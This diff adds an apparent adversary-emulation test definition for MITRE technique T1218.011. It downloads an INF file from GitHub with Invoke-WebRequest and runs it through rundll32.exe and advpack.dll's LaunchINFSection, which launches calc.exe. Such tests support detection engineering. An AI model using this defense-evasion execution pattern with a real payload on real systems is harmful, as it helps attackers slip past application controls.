@@ -1,0 +1,36 @@
+api_version: "2.0"
+name: Rundll32 advpack.dll Execution
+description: |
+    Test execution of a command using rundll32.exe with advpack.dll.
+    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+    Upon execution calc.exe will be launched
+args:
+    - name: inf_to_execute
+      type: string
+      default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
+uuid: d91cae26-7fc1-457b-a854-34c8aad48c89
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.011: Rundll32'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Inf file must exist on disk at specified location ("#{inf_to_execute}")
+      inline: |
+        if (Test-Path "#{inf_to_execute}") {exit 0} else {{New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
+        }}
+      executor: powershell
+    - name: rundll32-advpack.dll-execution
+      inline: |
+        rundll32.exe advpack.dll,LaunchINFSection "{{.Args.inf_to_execute}}",DefaultInstall_SingleUser,1,
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
